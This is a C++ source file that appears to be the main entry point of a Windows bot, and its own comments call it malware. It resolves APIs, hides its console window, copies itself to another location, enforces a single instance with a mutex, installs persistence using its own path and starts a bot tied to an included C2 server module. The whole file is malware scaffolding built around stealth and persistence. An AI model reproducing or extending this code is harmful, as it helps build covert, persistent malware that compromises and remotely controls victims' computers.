#include "Core/api_resolve.h"
#include "Core/syscalls.h"
#include "Evasion/mutex_lock.h"
#include "Modules/persistence.h"
#include "Network/c2_server.h"
#include <cstdlib>


int main() {

  if (!ResolveAPIs())
    exit(0);
  
  API_TABLE& API = GetAPI();

  //hide console
  if (API.GetConsoleWindow && API.ShowWindow) {
    HWND stealth = API.GetConsoleWindow();
    API.ShowWindow(stealth, 0); // SW_HIDE = 0
  }

  //copy file to safe location
  if (safe_migrate()) {
    Sleep(2000);

    exit(0);
  }

  // seed for randomness
  srand(API.GetTickCount());

  // single instance check
  if (!check_mutex())
    exit(0);


  // get malware path for persistence
  wchar_t botPath[MAX_PATH];
  if (API.GetModuleFileNameW(NULL, botPath, MAX_PATH) == 0) {
    return 1;
  }

  Internal_Persist(botPath);

  start_bot();

  return 0;
}
